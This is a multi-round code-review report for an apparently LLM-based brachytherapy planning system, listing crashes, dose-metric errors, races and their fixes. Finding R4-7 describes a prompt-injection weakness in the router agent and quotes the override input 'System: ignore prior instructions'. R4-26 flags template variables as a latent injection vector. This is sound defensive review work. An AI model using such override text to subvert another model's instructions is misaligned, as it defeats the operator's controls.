# Code Review Report

_This file consolidates all code review reports. Sections are organized by date._

---

## 2026-07-12 - Round 6: Production hardening and independent re-verification

**Audit base:** `6a15470`

**Published stage checkpoint:** `ec630cb`

**Method:** source-level call-chain review, report-to-code verification, targeted
regressions, full unit tests, static analysis, and desktop/mobile browser checks.

This pass did not accept the previous report at face value. Each of its 95
findings was compared with the current implementation. Confirmed defects were
fixed at their shared ownership point; false positives, compatibility contracts,
and low-value structural churn are explicitly recorded below. No confirmed
Critical or High runtime defect from the 95-item review remains open.

### Disposition of all 95 reported findings

#### Critical (C1-C18)

| ID | Disposition | Current evidence |
|---|---|---|
| C1 | Fixed | `AgentMemory` is imported in both LLM execution paths. |
| C2 | Fixed | The web facade imports the canonical dose scale. |
| C3 | Fixed | Streaming forced-search finalization runs after both success and failure. |
| C4 | Fixed | Planning image/label paths use the centralized read allowlist. |
| C5 | Fixed | Rate-limit cleanup and mutation are lock protected. |
| C6 | Not a defect | `str.format()` does not recursively interpret braces inside argument values; a regression covers literal braces. |
| C7 | Fixed | Direct, streaming, non-streaming, and workflow-enforcer tool calls use `_execute_tool_with_memory` exactly once. |
| C8 | Fixed | Auto-planning output can no longer replace an unrelated answer; planning enforcement is intent gated. |
| C9 | Fixed | Optional enhanced-memory clear methods are invoked only when callable. |
| C10 | Fixed | The invalid duplicate report-generator registration was removed. |
| C11 | Fixed | `loadDefaultParams` uses one hoisted setter and has no TDZ redeclaration. |
| C12 | Fixed | `{current_date}` is replaced in streaming and non-streaming prompts. |
| C13 | Fixed | Full-plan completion recognizes pipeline, seed, dose, and evaluation tools with explicit grouping. |
| C14 | Fixed | Advice detection is scoped and no longer converts general knowledge questions into planning runs. |
| C15 | Fixed | STL export writes real ASCII STL geometry. |
| C16 | Fixed | Step number styling exists in the split CSS bundle. |
| C17 | Fixed | The orphan CSS declaration was removed during stylesheet modularization. |
| C18 | Fixed | Warning cards retain their amber border. |

#### High (H1-H22)

| ID | Disposition | Current evidence |
|---|---|---|
| H1 | Fixed | Experience recording uses safe optional-component access. |
| H2 | Fixed | Invalid font-family quoting was corrected. |
| H3 | Fixed | Cancellation is checked between streaming LLM rounds and by generation token. |
| H4 | Fixed by contract | Both paths use the same CT-loaded predicate while trusted-local developer tools remain available without CT. |
| H5 | Fixed | Runtime exception handling no longer catches process-control exceptions with bare `except`. |
| H6 | Fixed | Viewer image reads use `_validate_path`, including configured modality roots. |
| H7 | Fixed | Oversized requests and unhandled exceptions return JSON; 500s are logged. |
| H8 | Fixed | Dose calibration is centralized in `plans.dose_pre.model_loader`. |
| H9 | Fixed | The configured Anthropic provider dependency is declared. |
| H10 | Operational, not source defect | External stale worktrees are deliberately not deleted or overwritten by product code. |
| H11 | Fixed | Python-style tool payloads use `ast.literal_eval`; JSON remains the primary protocol. |
| H12 | Fixed | Response cleaning was consolidated and unreachable/redundant branches removed. |
| H13 | Intentional alias | DICOM export route names share one implementation for backward compatibility. |
| H14 | Fixed | CT transfer clips before signed 16-bit conversion. |
| H15 | Fixed | Mesh-cache order uses `deque.popleft()`. |
| H16 | Fixed | Repeated imports were moved out of the OAR-label loop. |
| H17 | Fixed | One dose-overlay renderer is authoritative; compatibility callers delegate to it. |
| H18 | Fixed | Contour labels require a finite level before formatting. |
| H19 | Fixed | Dynamic UI language reads the single `_i18nLang` state. |
| H20 | Fixed | Mesh-cache keys contain a BLAKE2 mask-content digest. |
| H21 | Fixed | The 500 handler logs the originating exception. |
| H22 | Fixed | Required API-key mode fails during startup when the key is absent. |

#### Important (I1-I25)

| ID | Disposition | Current evidence |
|---|---|---|
| I1 | Fixed | Status reads the canonical `ct_image` state. |
| I2 | Fixed | The dead route `session_context` argument was removed. |
| I3 | Fixed | First-party `brachybot-*.js` files contain no production `console.log`. |
| I4 | Fixed | Conversation `data_available` is populated from canonical case memory. |
| I5 | Fixed | `dose_engine` is canonical and legacy names are explicit aliases only. |
| I6 | Fixed | Production diagnostics use logging rather than ad-hoc prints. |
| I7 | Fixed | Completion detection covers every supported planning completion path. |
| I8 | Fixed | OAR counts resolve by label/name metadata instead of mismatched keys. |
| I9 | Fixed | Browser chat history is bounded. |
| I10 | Fixed | Planning data-tree arrays are null guarded. |
| I11 | Verified | Script order and global UI API contract are documented and checked by browser load tests. |
| I12 | Fixed | Tool execution/storage/recovery is centralized; only orchestration-specific control flow remains. |
| I13 | Intentional structure | Generator and return-value loops remain separate, but share prompt, parsing, execution, review, and cancellation helpers. |
| I14 | Fixed | The dead Anthropic conversion helper was removed. |
| I15 | Fixed | Routes resolve a request-scoped agent through `get_agent`; no patient-global agent is used. |
| I16 | Fixed | The `builtins` operation-tracker monkey patch was removed. |
| I17 | Fixed | Upload paths use the canonical `UPLOAD_DIR`. |
| I18 | Fixed | Screenshot capture is awaited. |
| I19 | Fixed | Screenshot requests are correlated by request id instead of a timer race. |
| I20 | Fixed | 3D reconstruction uses server-provided label IDs. |
| I21 | Fixed | Dose texture sampling prefetches unique slices in a batch. |
| I22 | Fixed | Agent memory owns one real lock; no orphan fallback lock protects nothing. |
| I23 | Fixed | Overlay thresholding and display use the same intensity frame. |
| I24 | Fixed | Regression suites now cover runtime, routes, security, planning, coordinates, reports, and UI contracts. |
| I25 | Duplicate | Same finding as C12; covered by the current-date regressions. |

#### Minor (M1-M30)

| ID | Disposition | Current evidence |
|---|---|---|
| M1 | Fixed | Ruff removed all unused imports from `agent_runtime`. |
| M2 | Accepted style debt | Remaining eager logger formatting is not a correctness defect; array-heavy hot paths were reviewed separately. |
| M3 | Intentional ownership | `seeds_3d` is a viewer representation endpoint even though its data originates in planning. |
| M4 | Intentional compatibility | Remaining inline styles define report/form geometry and PDF pagination; the rationale is documented in `index.html`. |
| M5 | Accepted organization debt | Moving data-tree CSS alone has no product benefit and risks cascade changes; ownership is documented. |
| M6 | Fixed | All CT/MR/US/data/output/filesystem root variables are documented in README. |
| M7 | Fixed | Agents are request/session scoped and guarded by the session lock. |
| M8 | Intentional protocol handling | Cleaning patterns represent different provider protocols; shared normalization is centralized where semantics match. |
| M9 | Fixed | No unused random API key is generated; loopback/no-key and remote/key behavior is explicit. |
| M10 | Fixed | Same parser correction as H11. |
| M11 | Fixed | Provider calls use bounded retry behavior without replaying completed tool side effects. |
| M12 | Fixed | Conversation clearing no longer references an unrelated experience-memory attribute. |
| M13 | Fixed | Runtime mixins are exported and BrachyAgent validates their composition at startup. |
| M14 | Fixed | Cross-file i18n startup uses a bounded compatibility retry. |
| M15 | Fixed | Dead todo template constants were removed. |
| M16 | Intentional compatibility | Classic scripts expose the window-level UI control contract; an all-at-once ES-module migration is required before strict mode. |
| M17 | Fixed | 3D rendering is event driven and pauses when the document is hidden. |
| M18 | Fixed | The welcome message participates in the UI language system. |
| M19 | Fixed | Parallel language state was consolidated. |
| M20 | Fixed | Pytest configuration and async support are declared. |
| M21 | Fixed | The unused websocket client collection was removed. |
| M22 | Fixed | The dead `first_url` variable was removed. |
| M23 | Intentional model contract | `normalize_dose_image` creates myDoseNet conditioning input, not a physical dose estimate; an English comment prevents misuse. |
| M24 | Operational, not source defect | External test worktrees are outside this tracked product tree and are not silently modified. |
| M25 | Fixed | API keys and screenshot signatures use constant-time HMAC comparison. |
| M26 | Fixed | Upload sanitization helpers are module scoped. |
| M27 | Fixed | Duplicate tooltip keys were removed. |
| M28 | Fixed | Display/volume conversion guards zero resample ratios. |
| M29 | Fixed | Report source/reset arguments use JSON serialization plus HTML-attribute escaping in both renderers. |
| M30 | Fixed | Duplicate object-literal keys were removed. |

### Additional confirmed defects fixed in Round 6

| Area | Verified problem | Resolution |
|---|---|---|
| Planning core | Standalone seed planners unpacked a variable-length plan as a 2-tuple; auto direction, Dxcc spacing, NumPy truth checks, metadata `None`, RL dispatch, and OAR provenance also had real edge failures. | Corrected at the shared planning/model boundary with regressions. |
| Dose model | Manual preview and legacy utilities could imply analytical/Gaussian dose; checkpoint loading and scale interpretation were duplicated. | Active dose is myDoseNet-only and fails closed without a checkpoint. Legacy analytical entry points fail explicitly. |
| Intra-operative replanning | Unverified coordinate frames and independent replacement-dose planning could report false success. | Physical-frame verification, assignment-based seed matching, residual myDoseNet planning, and cumulative dose evaluation were added. |
| Session and cancellation | UI state, screenshots, history restoration, and cancellation could cross or outlive turns. | State is session scoped; cancellation uses per-turn generation tokens and stale callbacks cannot finish a newer turn. |
| Web security | `web_fetch` allowed unsafe destinations, document reads had broad path/size boundaries, and signed image handling was inconsistent. | Added redirect-aware SSRF checks, root/size enforcement, and short-lived signed image URLs. |
| Coordinates and geometry | Seed segmentation exposed array-order coordinates as physical XYZ and surface extraction treated full volumes as boundary shells. | Added explicit ZYX-to-index-to-physical conversion and true boundary extraction without changing the established viewer coordinate contract. |
| Frontend/reporting | DVH had duplicate/unreachable interpolation code and a 30-curve cap; opacity zero could fall back to a nonzero default; report layout/reset fields had responsive and escaping defects. | All available DVH curves render with bounded monotone interpolation/tooltips, zero opacity hides cleanly, and report/editor/viewer layouts are responsive and escaped. |
| CTV model routing | Non-target/MRI research models were exposed as automatic CT CTV choices; direct calls bypassed canonical memory processing; prompts/tool catalogs disagreed. | Automatic registry now contains only supported CT target routes, direct execution is canonical, and ambiguous sites trigger clarification. |
| CTV provenance routing | A prior manual/imported CTV could leave `manual_label` in case memory, and direct segmentation treated that provenance marker as a model name. | Direct routing now admits only the explicit automatic CTV model allowlist; source markers and unsupported sites return to clarification instead of invoking a model. |
| PANORAMA labels | Vein/artery and duct names were incomplete or reversed in the optional VoCo path. | Mapping now follows the official PANORAMA legend: PDAC=1, veins=2, arteries=3, pancreas=4, pancreatic duct=5, common bile duct=6. |
| Python/CLI planning API | `ctv_path` was optional but there was no way to provide a tumor model, so automatic CTV planning failed by construction. | Added backward-compatible `tumor_type`, CLI `--tumor-type`, `--host`, environment-backed port/host, and clear preflight failure for ambiguity. |

### Deliberate product and clinical boundaries

- The established SimpleITK physical-coordinate chain and current LPS-oriented
  planning contract were preserved. No speculative flip or axis rewrite was made.
- `dose_distribution_gy` remains a legacy compatibility key in a few responses;
  payloads also state `dose_units=normalized_model_output` and
  `dose_scale_gy`, so callers can interpret the calibrated myDoseNet output.
- Unknown tumor sites never inherit another site's prescription or OAR limit.
  Clinical pass/fail language requires explicit `plan_config` or source-backed
  `clinical_kb` evidence.
- All DVH structures are retained. Rendering is not silently truncated; dense
  legends may scroll or collapse visually without deleting clinical curves.
- Code execution, shell execution, environment management, and LLM-authored
  tool creation remain available only through explicit trusted-local toggles.
  They are developer capabilities, not operating-system sandboxes.

### Final verification evidence

- `pytest -q`: **99 passed** (13 third-party deprecation warnings).
- Ruff: F821/F822/F823/E9 passed repository-wide; F401 passed for
  `agent_runtime` after import cleanup.
- `compileall`: passed for production packages, CLI, and tests.
- `node --check`: passed for all 11 `brachybot-*.js` application scripts and
  the bundled `OrbitControls.js` support script.
- Browser desktop (`1280x720`): no horizontal overflow and no console warnings/errors.
- Browser mobile (`390x844`): no horizontal overflow, no off-viewport elements,
  and no console warnings/errors.
- `brain/core/toolset.json` parses and every CTV catalog source is an HTTP(S) link.

### Residual validation boundary

This repository pass does not replace site validation. The optional CTV
checkpoints, myDoseNet checkpoint, TotalSegmentator runtime, GPU execution, and
complete planning on representative clinical CT series were not available for a
fresh local end-to-end clinical run. Those components therefore remain research
software requiring independent dosimetric, geometric, and clinical validation
before patient use. This is an evidence boundary, not an unimplemented code
fallback.

---

## 2026-07-10 — Round 5: Final sweep pass (no code changes)

This round re-verified all CRITICAL/HIGH findings from Rounds 1–4 and confirmed they remain open. No code was modified — this is a purely documentary update. Total findings across all rounds: **18 CRITICAL, 32 HIGH, 44 MEDIUM, 51 LOW** (~145 issues).

The four most clinically impactful unremediated findings are:

| Round | ID | Severity | Summary |
|-------|----|----------|---------|
| R4-1 | seed_planning.py + seed_planning_rule_based.py | CRITICAL | `core.optimal_plan` return-value unpacking crashes on >2 trajectories — both standalone seed-planning tools are non-functional for all realistic cases |
| R4-2 | planning_pipeline.py:949 | CRITICAL | Literal `"auto"` string passed as `ref_direc` — falls back to `[0,0,1]` needle direction instead of organ-aware default |
| R4-3 | planning_pipeline.py:1435 | CRITICAL | OAR Dxcc metrics use original CT voxel volume (~2.3 mm³) instead of resampled-grid volume (~28 mm³) — metrics off by ~12× |
| R4-4 | AgenticSys.py:1101 | CRITICAL | `result.metadata is None` crash on tools returning success with no metadata |

No new issues were identified in this pass beyond what Rounds 1–4 already document.

---



This round scanned all code that was missed by previous rounds (Round 1–3 focused on `plans/`, `brain/`, `agent_runtime/`, `web/`, `memory/`, `skills/`, `quality/`, `communication/`, `utils/`). Still-unreviewed modules were dispatched to 4 parallel review agents. Every finding below was confirmed by tracing at least one level into the call chain.

**Newly reviewed (unreviewed in previous rounds):**
| Module | LOC | Agent coverage |
|--------|-----|----------------|
| `AgenticSys.py` | 1829 | Top-level orchestration: tool execution, memory wiring, auto-planning trigger |
| `agents/` | 2715 | Multi-agent orchestration: `orchestrator`, `plan_reviewer`, `safety_guardian`, `router_agent`, `fact_checker`, `completeness_checker`, `brachy_agent_wrapper`, `base_agent` |
| `tool_factory/seed_plan/planning_pipeline.py` | 1726 | Clinical planning pipeline: trajectory init/refine, seed planning orchestration, dose computation, OAR metrics |
| `tool_factory/seed_plan/seed_planning.py`, `seed_planning_rule_based.py`, `seed_planning_rl.py` | ~600 | Standalone seed-planning tool wrappers |
| `tool_factory/clinical_kb/__init__.py` | 651 | Clinical knowledge base loading and constraint retrieval |
| `tool_factory/safety_validator/__init__.py` | 540 | Safety validation rules, OAR constraint checking |
| `config/prompts/` + `config/prompts/multi_agent/` | 218 | LLM system prompts (markdown files + __init__) |
| `brain/knowledge/rag.py` + `knowledge_base.json` | 130+81 | Knowledge retrieval (RAG) + indexed knowledge chunks |
| `brain/knowledge/ui_knowledge.json` | 358 | UI knowledge for LLM reference |
| `brain/prompts/` | 10 | Empty (placeholder) |
| `dose_pre/` (root) | 513 | Dose prediction model (duplicate of `plans/dose_pre/`) |
| `brachybot.py` | 124 | CLI entry point |
| `brain/demos/demo.py` | 316 | Integration demo script |
| `tests/` | 1327 | Test suite (basic + multi-agent phase 2/3) |

**NOT reviewed in this pass (already covered in Rounds 1–3 or non-code):**
- `plans/`, `brain/` (core), `agent_runtime/`, `web/`, `memory/`, `skills/`, `quality/`, `communication/`, `utils/` (Round 3)
- `benchmarks/` (20K LOC but mostly JSON test vectors; `aligned_benchmark.py` is test-runner code — low priority for algorithmic review)
- `docs/ref.py` (7.5K LOC reference file — helper functions only, not production)
- `tool_factory/env_manager/envs/` (vendored venvs — not project code)
- `tool_factory/auto_generated/` (auto-generated tool stubs)

---

### Round 4: CRITICAL findings (production-triggered crashes or wrong clinical output)

---

**R4-1. `core.optimal_plan` return-value unpacking crash in `seed_planning.py` and `seed_planning_rule_based.py`**

**Files:**
- `tool_factory/seed_plan/seed_planning.py:189`
- `tool_factory/seed_plan/seed_planning_rule_based.py:174`

**Code:**
```python
optimal_plan, _ = core.optimal_plan(
    init_trajectories=trajectories, ...
)
```

`core.optimal_plan` (defined in `plans/core.py:117`, return at line 320) returns a list of N trajectory-result lists: `[ [traj_info, seeds, doses], ... ]`. It does NOT return a 2-tuple. The unpacking `optimal_plan, _ = ...` crashes with `ValueError: too many values to unpack` for any clinical case that produces more or fewer than 2 trajectories.
- Typical clinical cases: 5–50 trajectories.
- SeedPlanningTool and RuleBasedSeedPlanningTool are **non-functional for all realistic clinical cases** — any user calling these explicit tool endpoints gets an immediate crash.
- The RL-based tool (`seed_planning_rl.py:152`) correctly calls `optimal_plan = core.optimal_plan_rf(...)` with single-assignment, confirming the other two paths were copy-paste errors.
- The `planning_pipeline.py:1117` path calls the same `core.optimal_plan` and correctly assigns the whole list to `plan_res` without unpacking — so the pipeline path works but the standalone tools are broken.

**Suggested fix:** Change both sites to `optimal_plan = core.optimal_plan(...)` (single assignment).

---

**R4-2. Literal string `"auto"` passed as `ref_direc` to `_step_trajectory_init` (trajectory refine path)**

**File:** `tool_factory/seed_plan/planning_pipeline.py:949`

**Code:**
```python
# Pass sentinel "auto" so the init step picks an organ-aware default
init_result = self._step_trajectory_init(ct_image, ctv_mask, oar_mask, "auto", {}, agent)
```

The literal string `"auto"` is passed where `_step_trajectory_init` expects a direction vector. Inside `_step_trajectory_init` (line 867):
```python
ras_direc = np.array(ref_direc).reshape(-1)      # array(['auto']) dtype='<U4'
voxel_direc = _convert_ref_direc_to_voxel(ras_direc, resampled_ct)  # string × float → exception
```
`np.array("auto").reshape(-1)` → `array(['auto'])` (shape `(1,)`, dtype string). Then `ras_direction_to_voxel` does `ras_direc @ direction` which is string × float → fails at NumPy level. Exception caught at line 870 → falls back to `voxel_direc = np.array([0, 0, 1])`.

A `_resolve_ref_direc` function exists (line 353) that correctly handles `"auto"` by resolving to organ-specific defaults, geometric detection, or a global default. The main path (line 656) uses it — the refine path at line 949 does not.

**Impact:** When `_step_trajectory_refine` auto-recovery triggers (trajectories missing from memory), the fallback direction `[0, 0, 1]` (= "inferior" in LPS, needle from feet up) is used instead of the correct organ-aware approach direction (e.g., posterior for pancreas). Resulting trajectories may miss the CTV entirely.

**Suggested fix:** Resolve through `_resolve_ref_direc` before passing:
```python
resolved_ref_direc = _resolve_ref_direc("auto", ct_image, ctv_mask, agent)
init_result = self._step_trajectory_init(ct_image, ctv_mask, oar_mask, resolved_ref_direc, {}, agent)
```

---

**R4-3. OAR Dxcc metrics computed with wrong voxel volume (wrong spacing used)**

**File:** `tool_factory/seed_plan/planning_pipeline.py:1435`

**Code:**
```python
spacing = agent.memory.retrieve("ct_spacing") or (0.68, 0.68, 5.0)
voxel_vol_cm3 = float(spacing[0] * spacing[1] * spacing[2]) / 1000.0
```

`"ct_spacing"` is stored as the **original CT spacing** (e.g., 0.68×0.68×5.0 mm from a 512×512×48 CT). But the dose distribution and OAR masks are on a **resampled planning grid** (128×128×64 with spacing ~2.7×2.7×~3.8 mm). The resampled CT with its correct spacing is stored in `agent.memory.retrieve("resampled_ct")` but never used here.

Voxel volume comparison:
- Original CT: 0.68 × 0.68 × 5.0 = 2.31 mm³
- Resampled grid: ~2.72 × 2.72 × ~3.75 = ~27.7 mm³
- Error factor: **~12×**

Because the Dxcc formula sorts doses descending and picks the top N voxels corresponding to x cm³, using a 12× smaller voxel volume means D2cc selects only 1/12 of the actual hottest voxels, overestimating the dose. All OAR metrics (D2cc, D1cc, D0.1cc, D50, etc.) are systematically wrong. A physician reviewing D2cc constraints would see misleading values — possibly causing false clearance of dangerous plans or false rejection of safe plans.

**Suggested fix:**
```python
resampled_ct = agent.memory.retrieve("resampled_ct") if agent else None
if resampled_ct is not None:
    spacing = resampled_ct.GetSpacing()
else:
    spacing = (0.68, 0.68, 5.0)  # fallback
voxel_vol_cm3 = float(spacing[0] * spacing[1] * spacing[2]) / 1000.0
```

---

**R4-4. `AgenticSys.py:_execute_tool_with_memory` — `result.metadata` is `None` crash**

**File:** `AgenticSys.py:1101, 1158-1159`

**Code (line 1101):**
```python
if tool_name == "ctv_segmentation" and "ctv_array" in result.metadata:
```
And (line 1159):
```python
logger.info(f"OAR segmentation result: oar_array={'oar_array' in result.metadata}, ...")
```

If any tool returns `ToolResult(success=True, metadata=None)`, both `in` operations crash with `TypeError: argument of type 'NoneType' is not iterable`. The connected path at lines 1274+ already uses the safe pattern `(oar_result.metadata or {})` but these two sites were not updated.

**Impact:** A tool that returns metadata=None (e.g., a buggy version of segmentation, or a newly registered third-party tool) crashes the entire `_execute_tool_with_memory` flow, aborting post-execution processing (memory stores, label merging, auto-planning trigger). The user sees a 500 error with no recovery.

**Suggested fix:**
```python
meta = result.metadata or {}
if tool_name == "ctv_segmentation" and meta and "ctv_array" in meta:
```

---

### Round 4: HIGH findings (production-triggered, incorrect results or hangs)

---

**R4-5. Agents/orchestrator.py — `_global_context` shared dict race across async hops**

**File:** `agents/orchestrator.py:66, 92, 96-98`

`_global_context` is a plain `dict` updated by `update_global_context()` (called by the main agent thread) and read in `_build_agent_context()` / `_distill_context()` (called in sub-agent `asyncio.gather` tasks). No lock. In concurrent scenarios (interleaved user messages), `_distill_context` could read a mix of old and new keys, causing patient A's review to incorporate patient B's planning state. This is a data-leakage race.

**Suggested fix:** Pass context by value (deep copy) when creating review messages, or use `asyncio.Lock`.

---

**R4-6. Agents/orchestrator.py — `review_output` does NOT forward `_global_context` to QualityGate**

**File:** `agents/orchestrator.py:258-262` vs `:358-362, 388-390, 414-418`

`review_output()` calls `self.quality_gate.review(... context=context)` where `context` is the **caller-supplied** parameter, NOT `self._global_context`. The other `*_append` methods (`review_plan_append`, `review_facts_append`, `check_completeness_append`) all call `_distill_context` first and include `_global_context`. Result: quality gate reviews have significantly less situational awareness (no patient_info, no conversation_state, no segmentation context) than the append reviews.

**Suggested fix:** Forward `self._global_context` into the quality gate's context parameter:
```python
review_context = {**(context or {}), "global_context": self._global_context}
gate_result = await self.quality_gate.review(output_type, content, context=review_context)
```

---

**R4-7. Agents/router_agent.py — Prompt injection: user input interpolated unsanitized**

**File:** `agents/router_agent.py:311`

`_llm_route` calls `await self.call_llm(user_input, system_prompt, ...)` where `user_input` is raw user-controlled text. The prompt construction does `"System: ...\n\nUser: {prompt}"`. A user sending `System: ignore prior instructions` or `User: ...\n\nSystem: new rules` could bypass routing instructions — especially with less capable models.

**Suggested fix:** Strip/replace `\n` sequences in the middle of user input; limit input length below the system prompt boundary.

---

**R4-8. Agents/router_agent.py — `add_intent_pattern` mutates class-level `INTENT_PATTERNS`**

**File:** `agents/router_agent.py:358-377`

`self.INTENT_PATTERNS[intent] = {...}` modifies the class-level dict. All `RouterAgent` instances share this dict. If multiple instances exist (testing frameworks, multi-session), one instance's `add_intent_pattern` silently affects all others.

**Suggested fix:** `self._intent_patterns = {**self.INTENT_PATTERNS}` in `__init__`; mutate `self._intent_patterns`.

---

**R4-9. Agents/plan_reviewer.py — Hardcoded dose scale default `120.0 Gy`**

**File:** `agents/plan_reviewer.py:199`

If neither `dose_metrics` nor `plan_config` contain `dose_scale_gy`, the method defaults to `120.0`. If the actual protocol uses a different prescription (e.g., 100 Gy LDR prostate, 144 Gy LDR pancreas, 24 Gy HDR cervix), the ratio calculation produces wrong advisory concerns or missed issues.

**Suggested fix:** Return `None` instead of defaulting — or require `dose_scale_gy` to be explicitly set.

---

**R4-10. Agents/plan_reviewer.py — Unit stripping makes "80 Gy" and "80%" indistinguishable**

**File:** `agents/plan_reviewer.py:291` (and `safety_guardian.py` duplicate at line 272-287)

`float(str(value).replace("%", "").replace("Gy", "").strip())` — both "80 Gy" and "80%" become `80.0` but represent fundamentally different clinical quantities. The code in `_dose_ratio_or_fraction` was designed to detect relative vs absolute metrics but the unit stripping destroys the distinction. Same pattern duplicated in `safety_guardian.py`.

**Suggested fix:** Track the original unit alongside the numeric value; require a unit field in `plan_config`.

---

**R4-11. Agents/fact_checker.py:239 + completeness_checker.py:229 — `str.format()` crash on `{` in user/claim text**

**Files:**
- `agents/fact_checker.py:239`: `_CLAIM_PROMPT.format(claims=..., sources=...)`
- `agents/completeness_checker.py:229`: `_COMPLETENESS_PROMPT.format(user_message=..., ...)`

If any claim, source, user_message, or tool_step text contains literal `{` or `}` characters (e.g., "dose value {80 Gy}" in a claim, or API error messages), Python's `str.format()` raises `KeyError`/`IndexError`. The entire fact-check or completeness check fails and silently falls back to deterministic-only results.

**Suggested fix:** Escape braces before formatting: `.replace('{', '{{').replace('}', '}}')`, then use `.format()`.

---

**R4-12. `brain/knowledge/rag.py:96-111` — Hardcoded dose constraints with contradictions to `knowledge_base.json`**

**File:** `brain/knowledge/rag.py`

The `_default_response` dict and `DoseRAG` contain hardcoded dose constraint tables:
```python
"prostate": {"rectum": {"D2cc": 35.0}, "urethra": {"D0.1cc": 38.0}, "bladder": {"D2cc": 40.0}}}
"pancreas": {"duodenum": {"D0.1cc": 30.0}, "stomach": {"D0.1cc": 30.0}}
"lung": {"spinal_cord": {"D0.1cc": 10.0}, "heart": {"V100": 25.0}}
```
These have **no source citations** and **directly contradict** the data in `knowledge_base.json` (chunks 8-9):
- RAG.py: `prostate.rectum.D2cc = 35.0 Gy`
- knowledge_base.json chunk 8: `rectum` → `D2cc < 75 Gy (EQD2)` — 40 Gy higher!
- This is a 40 Gy discrepancy with no explanation.

The `DoseRAG` class at lines 113-120 provides a separate parallel code path from `SimpleRAG.retrieve()`, creating two paths for dose constraints that can give different answers.

**Suggested fix:** Remove hardcoded dose constraints from `rag.py`. Load all constraints from `knowledge_base.json` (with cited sources) or from `clinical_kb/`. Reconcile the contradictions.

---

**R4-13. `brain/knowledge/rag.py:47` — "RAG" is keyword token overlap, not semantic retrieval**

**File:** `brain/knowledge/rag.py:47`

`SimpleRAG.retrieve()` does `any(keyword in text for keyword in query_lower.split())` — plain substring keyword matching. No embeddings, no vector search, no semantic similarity. A query like "What is the spinal cord dose constraint?" would match any chunk containing the word "dose" or "cord", flooding results with irrelevant chunks. This is pattern matching, not Retrieval-Augmented Generation.

**Suggested fix:** Implement proper embedding-based retrieval or BM25/TF-IDF at minimum.

---

**R4-14. `agents/completeness_checker.py:194` — 30% keyword overlap threshold is arbitrary and untuned**

**File:** `agents/completeness_checker.py:194,199`

`len(req_words & resp_words) >= max(1, len(req_words) * 0.3)`. For a 1-keyword requirement ("segment"), threshold is 1 match — trivially satisfied by any sentence containing "segment" (false pass). For a 10-keyword requirement, needs 3 matches — may miss semantically equivalent but lexically different responses (false miss). No synonym expansion for clinical terms.

---

**R4-15. `agents/base_agent.py:17-22, 145-159` — Silent fallback when prompts absent**

**File:** `agents/base_agent.py`

If `from config.prompts.multi_agent import get_prompt` raises `ImportError`, `_PROMPTS_AVAILABLE = False` and `_load_system_prompt()` returns `""` silently. All agents run with ZERO system prompt — model behavior changes radically with no observable error.

---

### Round 4: MEDIUM findings (latent bugs, silent failures, performance)

---

**R4-16.** `planning_pipeline.py:527-534` — Documented `seed_info`/`planning_params` input kwargs accepted but silently ignored (latent — no caller passes them)

**R4-17.** `planning_pipeline.py:1098` — Python precedence bug: `agent.memory.retrieve(...) or agent.memory.retrieve(...) if agent else None` — when `agent is None`, the `agent.memory` raises `AttributeError` before the `if agent else None` guard because `or` binds before `if-else`. Fix: `(...) if agent else None`

**R4-18.** `AgenticSys.py:1041` — OAR dedup threshold `>= 50` hardcoded. Works for TotalSegmentator v2 (104 classes) but a subset model (~30 classes) never triggers dedup; OAR re-runs every time (30-60s GPU waste).

**R4-19.** `AgenticSys.py:1443-1445` — Auto-planning trigger hardcodes `mode="rl"` regardless of user config. If user configured `rule_based` planning, the auto-trigger uses RL mode anyway, producing different clinical output.

**R4-20.** `agents/orchestrator.py:193-195` — `asyncio.get_event_loop()` (deprecated in Python 3.12, may raise `RuntimeError` in 3.14+). Potential hard failure on Python upgrade.

**R4-21.** `agents/plan_reviewer.py:167-176` — Hardcoded advisory thresholds (`V100 < 0.80`, `V150 > 0.60`, etc.) contradicting the docstring statement that "thresholds are accepted only from runtime configuration." Incorrect for HDR brachytherapy where V150 > 0.60 is expected.

**R4-22.** `agents/safety_guardian.py:289-313` — Code duplication: `_dose_ratio_or_fraction`, `_normalized_fraction`, `_metric_value`, `_first_numeric`, `_target_checks` all duplicated from `plan_reviewer.py` with slight differences. Maintenance hazard.

**R4-23.** `brain/knowledge/knowledge_base.json` — Only 15 chunks, very limited coverage. Missing: pancreas-specific constraints, liver, cervical cancer, fractionation schedules, isotope activity ranges, TG-43/TG-186 formalism. No source citations (no PMID/DOI) for any constraint — LLM cannot cite sources.

**R4-24.** `config/prompts/orchestrator.md:20-24` — Hardcoded quality-gate thresholds in LLM prompt: `Score ≥ 7: pass`, `Score 5-6: conditional`, `Score < 5: reject`, `Reviewer confidence < 0.5: escalate`, `Score divergence > 3: escalate`. Should be configurable.

**R4-25.** `config/prompts/__init__.py` — `_load_prompt` silently returns `""` on file-not-found. Missing `clinical_kb.md` or `medical_safety.md` silently strips safety from system prompt.

**R4-26.** `config/prompts/system_prompt.md:80-84` — Template variables `{ui_state_summary}`, `{enhanced_context}`, `{clean_context}` — if the rendering side doesn't sanitize these, user-controlled content can inject instructions. Latent injection vector — depends on caller.

**R4-27.** `dose_pre/` is a byte-for-byte duplicate of `plans/dose_pre/` with minor divergences. `myDoseNet.py` imports `import os; import sys` dead code (lines 5-7). `Predict_crop.py` has `min=-1000; max=3000` shadowing Python builtins. No `__init__.py` so `from dose_pre import Predict_crop` fails.

**R4-28.** `dose_pre/myDoseNet.py:131` — `inplace=True` on LeakyReLU can interfere with gradient checkpointing if model is ever re-used for training. Inference-only currently, but latent risk.

**R4-29.** `brachybot.py:121` — `_run_server` calls `web.server.run_server(port=port)` with no try/except. If port is in use, Flask raises OSError with full traceback — no helpful error message.

**R4-30.** `brachybot.py:106` — `import web.server` inside `_run_server` not wrapped in try/except. If `web/server.py` has an import error, the server crashes with traceback rather than a user-friendly message.

**R4-31.** `brachybot.py:108-117` — Startup message duplicates LLM-detection logic. Only checks Anthropic and OpenAI — users of DeepSeek, Qwen, Gemini, etc. see no startup message.

**R4-32.** `brachybot.py:11-12` — `sys.path.insert(0, ...)` shadows system packages. If a PyPI package named `config` or `skills` existed, the local module shadows it.

**R4-33.** `brain/demos/demo.py:124` — `OpenRouterLLM.__new__(OpenRouterLLM)` bypasses `__init__()`, potentially omitting credential/config loading from the demo.

**R4-34.** `tests/` — Only 4 test files with limited coverage. `test_multi_agent_phase3.py` (409 lines) is the only substantive integration test. No tests for: planning_pipeline, AgenticSys state management, planning_routes endpoints, agents/orchestrator.

**R4-35.** `planning_pipeline.py:397-423` — No GPU memory cleanup after dose model inference. `torch.cuda.empty_cache()` is not called. Long-running agent sessions may accumulate GPU memory.

---

### Round 4: LOW findings

---

